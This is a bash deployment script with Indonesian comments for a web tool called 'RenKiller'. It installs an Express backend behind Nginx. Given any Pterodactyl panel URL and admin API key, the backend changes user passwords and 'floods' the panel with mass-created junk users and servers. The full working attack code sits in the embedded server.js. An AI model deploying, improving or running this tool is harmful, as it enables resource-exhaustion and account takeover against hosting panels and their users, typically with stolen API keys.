#!/bin/bash
# ==========================================
# 🛠️ FIX 502 BAD GATEWAY (RENKILLER)
# Reinstall Node.js & Fix Nginx Total
# ==========================================

RED='\033[0;31m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'; YELLOW='\033[1;33m'; NC='\033[0m'
[[ $EUID -ne 0 ]] && { echo -e "${RED}❌ Harus root!${NC}"; exit 1; }

DOMAIN="killer.googleclient.biz.id"
WEB_ROOT="/var/www/$DOMAIN/public"
NODE_DIR="/opt/renkiller"
NGINX_CONF="/etc/nginx/sites-available/$DOMAIN"

echo -e "${CYAN}[1/5] Bersihin Folder Node.js & Install Ulang...${NC}"
# Stop service dulu
pm2 delete renkiller >/dev/null 2>&1
systemctl stop renkiller >/dev/null 2>&1

# Hapus folder lama biar bersih
rm -rf "$NODE_DIR"
mkdir -p "$NODE_DIR"
cd "$NODE_DIR"

# Bikin package.json baru
cat > package.json << 'EOF'
{
  "name": "renkiller-backend",
  "version": "6.0.0",
  "main": "server.js",
  "dependencies": {
    "express": "^4.19.2",
    "cors": "^2.8.5",
    "axios": "^1.7.2"
  }
}
EOF

# Install modul
echo "-> Install NPM Modules..."
npm install --silent

# Bikin server.js baru (Fix 100%)
cat > "$NODE_DIR/server.js" << 'NODEEOF'
const express = require('express');
const axios = require('axios');
const cors = require('cors');
const app = express();
app.use(cors()); app.use(express.json());

const makeApi = (panelUrl, apiKey) => axios.create({ 
    baseURL: `${panelUrl}/api/application`, 
    headers: { 'Authorization': `Bearer ${apiKey}`, 'Content-Type': 'application/json', 'Accept': 'Application/vnd.pterodactyl.v1+json' }, 
    timeout: 30000 
});

// 1. STATS
app.post('/api/stats', async (req, res) => { 
    const { panelUrl, apiKey } = req.body; 
    try { 
        const api = makeApi(panelUrl, apiKey); 
        const [u, s] = await Promise.all([api.get('/users?per_page=1'), api.get('/servers?per_page=1')]); 
        res.json({ status: true, totalUsers: u.data.meta.pagination.total, totalServers: s.data.meta.pagination.total, freeAllocs: 'OK' }); 
    } catch (e) { 
        res.json({ status: false, message: e.message }); 
    } 
});

// 2. CHANGEPASS
app.post('/api/changepass', async (req, res) => { 
    const { panelUrl, apiKey, userId, newPassword } = req.body; 
    try { 
        await makeApi(panelUrl, apiKey).patch(`/users/${userId}`, { password: newPassword }); 
        res.json({ status: true, message: "Password diganti!" }); 
    } catch (e) { 
        res.json({ status: false, message: e.response?.data?.errors?.[0]?.detail || e.message }); 
    } 
});

// 3. FLOOD USER (Versi Stream)
app.post('/api/flood-user', async (req, res) => {
    const { panelUrl, apiKey, targetCount, password } = req.body;
    res.setHeader('Content-Type', 'text/event-stream'); res.setHeader('Cache-Control', 'no-cache'); res.setHeader('Connection', 'keep-alive');
    const sendLog = (msg, type = 'info') => res.write(`data: ${JSON.stringify({ msg, type })}\n\n`);
    const api = makeApi(panelUrl, apiKey);
    const randName = (len = 8) => { let s = ''; const chars = 'abcdefghijklmnopqrstuvwxyz0123456789'; for (let i = 0; i < len; i++) s += chars[Math.floor(Math.random() * chars.length)]; return s; };
    
    sendLog(`Memulai Flood User (${targetCount} akun)...`, 'warn');
    for (let i = 1; i <= targetCount; i++) {
        const username = randName(8);
        try {
            await api.post('/users', { email: `${username}@killer.com`, username, first_name: username, last_name: "Killer", password });
            sendLog(`[${i}/${targetCount}] User ${username} Created`, 'success');
        } catch (err) { sendLog(`[${i}/${targetCount}] Gagal: ${err.response?.data?.errors?.[0]?.detail || err.message}`, 'error'); }
    }
    sendLog(`FLOOD USER SELESAI!`, 'success');
    res.write(`data: [DONE]\n\n`); res.end();
});

// 4. FLOOD SERVER (Versi Stream)
app.post('/api/flood-server', async (req, res) => {
    const { panelUrl, apiKey, targetCount, userId, nestId, eggId, memory, disk, cpu } = req.body;
    res.setHeader('Content-Type', 'text/event-stream'); res.setHeader('Cache-Control', 'no-cache'); res.setHeader('Connection', 'keep-alive');
    const sendLog = (msg, type = 'info') => res.write(`data: ${JSON.stringify({ msg, type })}\n\n`);
    const api = makeApi(panelUrl, apiKey);
    const randName = (len = 8) => { let s = ''; const chars = 'abcdefghijklmnopqrstuvwxyz0123456789'; for (let i = 0; i < len; i++) s += chars[Math.floor(Math.random() * chars.length)]; return s; };
    
    sendLog(`Memulai Flood Server (${targetCount} server)...`, 'warn');
    for (let i = 1; i <= targetCount; i++) {
        const srvName = `srv-${randName(6)}`;
        try {
            await api.post('/servers', {
                name: srvName, user: parseInt(userId), nest: parseInt(nestId), egg: parseInt(eggId),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_18", startup: "node index.js", environment: {},
                limits: { memory: parseInt(memory), swap: 0, disk: parseInt(disk), io: 500, cpu: parseInt(cpu) },
                feature_limits: { databases: 0, backups: 0, allocations: 1 }, allocation: { default: 1 }, start_on_completion: false
            });
            sendLog(`[${i}/${targetCount}] Server ${srvName} Created`, 'success');
        } catch (err) { sendLog(`[${i}/${targetCount}] Gagal: ${err.response?.data?.errors?.[0]?.detail || err.message}`, 'error'); }
    }
    sendLog(`FLOOD SERVER SELESAI!`, 'success');
    res.write(`data: [DONE]\n\n`); res.end();
});

// 5. FLOOD ALL
app.post('/api/flood-all', async (req, res) => {
    const { panelUrl, apiKey, targetCount, nestId, eggId, memory, disk, cpu, password } = req.body;
    res.setHeader('Content-Type', 'text/event-stream'); res.setHeader('Cache-Control', 'no-cache'); res.setHeader('Connection', 'keep-alive');
    const sendLog = (msg, type = 'info') => res.write(`data: ${JSON.stringify({ msg, type })}\n\n`);
    const api = makeApi(panelUrl, apiKey);
    const randName = (len = 8) => { let s = ''; const chars = 'abcdefghijklmnopqrstuvwxyz0123456789'; for (let i = 0; i < len; i++) s += chars[Math.floor(Math.random() * chars.length)]; return s; };
    
    sendLog(`Memulai Flood ALL (${targetCount} User+Server)...`, 'warn');
    for (let i = 1; i <= targetCount; i++) {
        const username = randName(8);
        let userId = null;
        try {
            const uRes = await api.post('/users', { email: `${username}@killer.com`, username, first_name: username, last_name: "Killer", password });
            userId = uRes.data.attributes.id;
            sendLog(`[${i}/${targetCount}] User ${username} (ID: ${userId}) Created`, 'success');
        } catch (err) { sendLog(`[${i}/${targetCount}] User Fail: ${err.response?.data?.errors?.[0]?.detail || err.message}`, 'error'); continue; }
        try {
            await api.post('/servers', {
                name: `srv-${username}`, user: userId, nest: parseInt(nestId), egg: parseInt(eggId),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_18", startup: "node index.js", environment: {},
                limits: { memory: parseInt(memory), swap: 0, disk: parseInt(disk), io: 500, cpu: parseInt(cpu) },
                feature_limits: { databases: 0, backups: 0, allocations: 1 }, allocation: { default: 1 }, start_on_completion: false
            });
            sendLog(`[${i}/${targetCount}] Server ${username} Created`, 'success');
        } catch (err) { sendLog(`[${i}/${targetCount}] Server Fail: ${err.response?.data?.errors?.[0]?.detail || err.message}`, 'error'); }
    }
    sendLog(`FLOOD ALL SELESAI!`, 'success');
    res.write(`data: [DONE]\n\n`); res.end();
});

app.listen(3000, '127.0.0.1', () => console.log('✅ Backend Running'));
NODEEOF

echo -e "${GREEN}  ✅ Node.js Siap${NC}"

# ==========================================
# 2. JALANIN PM2 & CEK STATUS
# ==========================================
echo -e "${CYAN}[2/5] Nyalain Backend pake PM2...${NC}"
# Install PM2 kalo belum ada
if ! command -v pm2 &> /dev/null; then
    npm install -g pm2 --silent
fi

# Start PM2
pm2 start "$NODE_DIR/server.js" --name "renkiller" --time
pm2 save

# Cek apakah port 3000 nyala
sleep 2
if curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:3000/ | grep -q "200\|404"; then
    echo -e "${GREEN}  ✅ Backend Nyala di Port 3000${NC}"
else
    echo -e "${RED}  ❌ Backend Gagal Nyala! Cek log PM2:${NC}"
    pm2 logs renkiller --lines 10 --no-daemon
    exit 1
fi

# ==========================================
# 3. FIX NGINX
# ==========================================
echo -e "${CYAN}[3/5] Fix Nginx (Proxy Pass)...${NC}"
cat > "$NGINX_CONF" << NGINXEOF
server {
    listen 80;
    server_name $DOMAIN;
    return 301 https://\$host\$request_uri;
}

server {
    listen 443 ssl http2;
    server_name $DOMAIN;
    root $WEB_ROOT;
    index index.php index.html;

    ssl_certificate /etc/letsencrypt/live/$DOMAIN/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/$DOMAIN/privkey.pem;
    include /etc/letsencrypt/options-ssl-nginx.conf;
    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem;

    location / {
        try_files \$uri \$uri/ /index.php?\$query_string;
    }

    location /api-killer/ {
        proxy_pass http://127.0.0.1:3000/;
        proxy_http_version 1.1;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_buffering off;
        proxy_read_timeout 300s;
    }

    location ~ \.php\$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/var/run/php/php8.1-fpm.sock;
    }
}
NGINXEOF

nginx -t >/dev/null 2>&1 && systemctl reload nginx
echo -e "${GREEN}  ✅ Nginx OK${NC}"

# ==========================================
# 4. FIX FILE FRONTEND (PASTIKAN URL BENAR)
# ==========================================
echo -e "${CYAN}[4/5] Fix Frontend URL API...${NC}"
# Ganti URL API biar sesuai domain (anti error fetch)
sed -i "s|const API_BACKEND = window.location.origin + '/api-killer';|const API_BACKEND = 'https://$DOMAIN/api-killer';|" "$WEB_ROOT/index.php"
echo -e "${GREEN}  ✅ Frontend Fixed${NC}"

# ==========================================
# 5. FINALISASI
# ==========================================
echo -e "${CYAN}[5/5] Restart Nginx & PHP...${NC}"
systemctl restart php*-fpm nginx

echo -e "${GREEN}╔════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║  ✅ FIX 502 BERHASIL!                      ║${NC}"
echo -e "${GREEN}║  🚀 Backend Nyala, Proxy Fixed             ║${NC}"
echo -e "${GREEN}╚════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${CYAN}🔗 Buka Web:${NC} https://$DOMAIN"
echo -e "${YELLOW}⚠️  Clear Cache (Ctrl+Shift+R) dulu bro!${NC}"
echo ""
echo -e "${YELLOW}💡 Kalo masi 502, coba cek log:${NC}"
echo -e "   ${WHITE}pm2 logs renkiller${NC}"
